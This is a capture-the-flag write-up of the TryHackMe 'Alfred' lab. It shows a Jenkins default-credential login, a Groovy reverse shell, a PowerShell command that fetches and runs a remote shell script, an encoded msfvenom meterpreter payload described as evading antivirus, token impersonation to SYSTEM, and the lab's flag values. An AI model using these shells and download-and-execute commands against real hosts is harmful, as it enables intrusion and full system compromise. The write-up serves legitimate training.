---
layout: post
title: THM - Alfred
author: _f0rmat
date: 2025-07-20
tags: nmap msfvenom jenkins groovy metasploit incognito impersonation
category: CTF
---

Difficulty: Medium
Status: Complete
IP: 10.10.16.110

# Resolution summary
- Initial access to backend Jenkins system due to default credentials
- once able to access could use the Jenkins groovy script console to call back to my attacker machine and get an initial shell.
- Shell upgraded to PowerShell on the machine and from that copied over an malicious exe file which would use meterpreter to catch the incoming connection on my attacker machine once more.
- After that succeeded I was able to use the incognito module of Metasploit to impersonate an administrator and migrate my process to another NT Authority process allowing full control.

## Improved skills
- nmap
- powershell

## Used tools
- jenkins
- groovy
- msfvenom

---

# Information Gathering

Scanned all ports:

```bash
nmap -p- -T5 10.10.16.110 -v

PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
```

Enumerated open ports:

```bash
nmap -p 80,3389,8080 -A 10.10.16.110 -v

PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).

3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2023-05-10T15:05:47+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=alfred
| Issuer: commonName=alfred
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-05-09T15:01:59
| Not valid after:  2023-11-08T15:01:59
| MD5:   9ae85ba96e8057e6aa8529b9513098c9
|_SHA-1: b5c25c022dc98830f2fbc4deb050fe83a42e74f8
| rdp-ntlm-info: 
|   Target_Name: ALFRED
|   NetBIOS_Domain_Name: ALFRED
|   NetBIOS_Computer_Name: ALFRED
|   DNS_Domain_Name: alfred
|   DNS_Computer_Name: alfred
|   Product_Version: 6.1.7601
|_  System_Time: 2023-05-10T15:05:42+00:00

8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

---

# Enumeration

## Port 80 - Microsoft IIS httpd 7.5

Initally browsing to the port 80 page we are presented with:

[![1](/assets/blog/THM/Alfred/1.png)](/assets/blog/THM/Alfred/1.png)

Checking the sourse of the page we find litte:

```shell
<html>
<head>
<style>
* {font-family: Arial;}
</style>
</head>
<body><center><br />
<img width="200" height+"300" src="bruce.jpg"><br /><br />
RIP Bruce Wayne<br /><br />
Donations to <strong>alfred@wayneenterprises.com</strong> are greatly appreciated.
</center></body>
</html>
```

## Port 8080 - Jetty 9.4.z-SNAPSHOT

Initally browsing to the port 8080 page we are presented with a login page for the Jenkins software.

[![2](/assets/blog/THM/Alfred/2.png)](/assets/blog/THM/Alfred/2.png)

Using the default username and password combination of admin:admin we gain access;

[![3](/assets/blog/THM/Alfred/3.png)](/assets/blog/THM/Alfred/3.png)

As we have access to this console we can check under Manage Jenkins for the Script Console which would allow us to run commands;

[![4](/assets/blog/THM/Alfred/4.png)](/assets/blog/THM/Alfred/4.png)

As we can run commands we can run a local http server on our machine and download files from it, such as in invoke-powershelltcp.ps1 reverse shell script

-----
# Exploitation

## Groovy Script

First we set up a listener on our machine to catch the response from the server;

```shell
nc -lvnp 1337
```

Now use a Groovy Script to call back to our machine and open a cmd window;

```shell
Thread.start {
String host="10.14.49.18";
int port=1337;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
}
```

Results;

```shell
└─$ nc -lvnp 1337                                                                                                
listening on [any] 1337 ...
connect to [10.14.49.18] from (UNKNOWN) [10.10.16.110] 49206
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Jenkins>whoami
whoami
alfred\bruce

C:\Program Files (x86)\Jenkins>
```
 
Now we need to enumerate further using PowershellTcp.ps1 though we need to set up a simple http server on our machine to host the file

```shell
└─$ python3 -m http.server     
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Now to download the file via cmd window we have open on the machine;

```shell
powershell iex (New-Object Net.WebClient).DownloadString('http://10.14.49.18:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.14.49.18 -Port 1338
```

Result;

```shell
└─$ nc -lvnp 1338                                                                                                
listening on [any] 1338 ...
connect to [10.14.49.18] from (UNKNOWN) [10.10.16.110] 49218
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins>whoami
alfred\bruce
PS C:\Program Files (x86)\Jenkins> 
```

---

# Lateral Movement to user

## Local Enumeration

Now we have Powershell access we can enumerate and find the user.txt flag

```shell
PS C:\users> cd bruce
PS C:\users\bruce> ls


    Directory: C:\users\bruce


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
d----        10/25/2019   8:05 PM            .groovy                           
d-r--        10/25/2019   9:51 PM            Contacts                          
d-r--        10/25/2019  11:22 PM            Desktop                           
d-r--        10/26/2019   4:43 PM            Documents                         
d-r--        10/26/2019   4:43 PM            Downloads                         
d-r--        10/25/2019   9:51 PM            Favorites                         
d-r--        10/25/2019   9:51 PM            Links                             
d-r--        10/25/2019   9:51 PM            Music                             
d-r--        10/25/2019  10:26 PM            Pictures                          
d-r--        10/25/2019   9:51 PM            Saved Games                       
d-r--        10/25/2019   9:51 PM            Searches                          
d-r--        10/25/2019   9:51 PM            Videos                            


PS C:\users\bruce> cd desktop
PS C:\users\bruce\desktop> ls


    Directory: C:\users\bruce\desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        10/25/2019  11:22 PM         32 user.txt                          


PS C:\users\bruce\desktop> type user.txt
**********************************
```

---

# Privilege Escalation

## Local Enumeration

To enumerate further we can use a metasploit shell, firstly we need to generate a payload

```shell
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.14.49.18 LPORT=4444 -f exe -o test.exe
```

This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.

We then download the file to the machine as before;

```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.14.49.18:8000/test.exe','test.exe')"
```

now we have the test.exe file on the host we can then run it with;

```shell
Start-Process "test.exe"
```

## Privilege Escalation vector

Now we have a meterpreter shell to the machine we can use a meterpreter module called incognito to impersonate and administrator

```shell
meterpreter > use incognito
Loading extension incognito...Success.
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > 
```

Now we have system access as an administrator we can migrate to another system process to ensure we have admin functions and from that we can navigate the file system till we find the root.txt file

```shell
meterpreter > migrate 992
[*] Migrating from 1708 to 992...
[*] Migration completed successfully.
meterpreter > cd c:\\Windows\\System32\\config
meterpreter > cat root.txt
**********************************
```

---

# Trophy & Loot

user.txt
```bash
79007a09481963edf2e1321abd9ae2a0
```

root.txt

```bash
dff0f748678f280250f25a45b8046b4a
```
